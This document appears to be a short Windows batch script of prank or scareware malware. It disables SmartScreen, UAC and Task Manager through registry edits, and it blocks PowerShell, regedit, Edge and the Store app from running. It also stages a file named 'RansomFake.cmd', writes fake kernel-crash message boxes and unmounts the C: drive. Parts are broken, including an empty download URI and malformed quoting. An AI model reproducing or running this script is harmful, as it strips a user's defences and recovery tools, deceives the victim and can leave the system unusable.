reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /t REG_DWORD  /v "DisallowRun" /reg:32 /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /t REG_DWORD /v "SmartScreenEnabled" /reg:32 /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "1" /d "powershell.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "2" /d "run.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "3" /d "msedge.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "4" /d "MicrosoftEdge.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "5" /d "pwsh.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "6" /d "WinStore.App.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "7" /d "regedit.exe" /f
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /reg:32 /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /REG:32 /d 1
Cd "%UserProfile%\appdata\roaming\Microsoft\Windows\Start Menu\Programs"
mkdir "Startup"
invoke-webrequest -Uri ""
Unblock-File "RansomFake.cmd"
echo "MsgBox "Windows is in crash state and the kernel is unavalabile!" ^& vbCrLf ,(0), "78ftc3sa9"" > corruption.vbs
echo "MsgBox "turn off nowf avoiding any corruption!" ^& vbCrLf ,262192, "ctu4st6f"" > corruption.vbs 
mountvol C: /d




















